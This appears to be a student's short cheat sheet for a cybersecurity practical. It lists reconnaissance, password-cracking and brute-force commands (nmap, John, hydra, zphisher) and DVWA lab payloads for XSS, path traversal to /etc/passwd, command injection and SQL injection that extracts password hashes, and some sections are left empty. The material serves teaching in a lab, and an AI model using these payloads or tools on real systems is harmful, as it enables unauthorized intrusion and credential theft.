# CS-Prectical-
Short note of CS Prectical 

## Main Commands
`sudo service apache2 start`

`sudo service mysql start`

`ip config`


## 1. Network Mapper 

Host Discorvry - `nmap -sn 127.0.0.1`

TCP SYN scan - `sudo nmap -sS 127.0.0.1`

Serive & version detection - `sudo nmap -sV 127.0.0.1`

OS Detecion - `sudo nmap -O 127.0.0.1`

Defult Script Scan - `sudo nmap -sC 127.0.0.1`

UDP scan - `sudo nmap -sU 127.0.0.1`

for write in file `sudo nmap -sU 127.0.0.1 -o Demo.txt`

# 2. Wireshark

`icmp`

`ping 127.0.0.1`

# 3. John the Ripper (Password Cracking) 

`nano hashes.txt`

insert hash `5f4dcc3b5aa765d61d8327deb882cf99`

`hash hahes.txt`

`ls /usr/share/wordlists`

`sudo gzip -d /usr/share/wordlists/rockyu.txt.gz`

`john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt`

`john --format=Raw-MD5 --show hashes.txt`


# 4. Whois (Domain Lookup)

`which whois`

`whois google.com`

`whois google.com > whois_result.txt`

`cat whois_result.txt`

# 5. Dig (DNS Query) 

`which dig`

`dig google.com`

`dig google.com MX`

`dig google.com NS`

# 6. TheHarvester (Target Domain: Example.com) 

`which theHarvester`

`theHarvester -d example.com -b all`

`theHarvester -d example.com -b all -f harvester_result`

# 7. Sublist3r

`which sublist3r`

`sublist3r -d example.com`

`sublist3r -d example.com -o subdomain.txt`

# 8. Dirbuster (Brute-Force Hidden Directories) 

Open DVWA 


# 9. Gobuster (Brute-Force Directory/Files)

`which gobuster`

`ls /usr/share/wordlists/dirb/`

`gobuster dir -u http://testphp.vulnweb.com -w /usr/share/wordlists/dirb/common.txt -o gobuster_result.txt`


# 10. Hydra (brutefoce attack) 

`ip a`

`ping 192.168.56.101`

`nmap -p 192.168.56.101`

`hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.101`


# 11. Dnsenum (DNS Information Gathering) 

`ip a`

`ping example.com`

`which dnsenum`

`dnsenum example.com -o dnsenum_result.xml`

# 12. Shodan

`shodan search port:22 --limit10 > shodan_result.txt`

`shodan search http.title:"login"`

`shodan search country:IN`



# 13. Zphisher

`bash zphisher.sh`



# 14. Burp Suite Intruder 

`ip a`

Open DVWA
Username: admin
Password: password

DVWA Security -> Low

Open Terminal

`burpsuite`

Configure Proxy 

Proxy -> Intercept -> ON 

In DVWA -> Vulnerabilities -> Brute Force 

Enter test credtials 

Username: test
Password: test123

Send Req to intruder 

Intruder tab 

Configure Sniper Atteck 

Atteck Type : Sniper 

Paylods tab -> Simple List -> Start Attack




# 15. Explotation on Metasploitable 





# 16. XSS(Reflected)

In DVWA -> XSS(reflected) 

`<script>alert("XSS")</script>`


# 17. File Inclusion on DVWA

In DVWA -> File Inclusion 

`http://127.0.0.1/dvwa/vulnerabilities/fi/?page=include.php`

where insted of this `inlcude.php` write this `../../../../../../../../etc/passwd`

`http://127.0.0.1/dvwa/vulnerabilities/fi/?page=../../../../../../../../etc/passwd`



# 18. Command Injection on DVWA

In DVWA -> Command Injection 

List Directories:
`127.0.0.1; ls`

Display Curent Direcotry:
`127.0.01; pwd`

Display Current USer 
`127.0.0.1: whoami`


# 19. XSS(Stored)

in DVWA ->XSS(Stored)

in comment add `<script>alert('XSS')</script>`



# 20. DVWA (SQL Injection)

In DVWA -> SQL Injection 

`1'`

`1 OR 1=1`

`1 UNION SELECT user, password FROM users`

`1 AND 1=1`

`1 AND 1=2`

`john --format=raw-md% hashes.txt`


# 21. Upload Vunlerability on DVWA

`nano test.php`

`<?php echo"FIle Upload Suceddful - Vulnerable!";?>`

Then DVWA -> File Upload

`https://127.0.0.1/dvwa/hackable/uploads/test.php`
 

# 22. SQLi (Blind)and Hash Crack 

`1 AND 1=1`

`1 AND 1=2`

Extract Pasword Hash 

`1 AND SUBSTRING((SELECT password FROM users WHERE user='admin'),1,1)='5'`

`hashcat -m0 hash.txt /usr/share/wordlists/rockyu.txt --force`


# 8. 


# 8. 



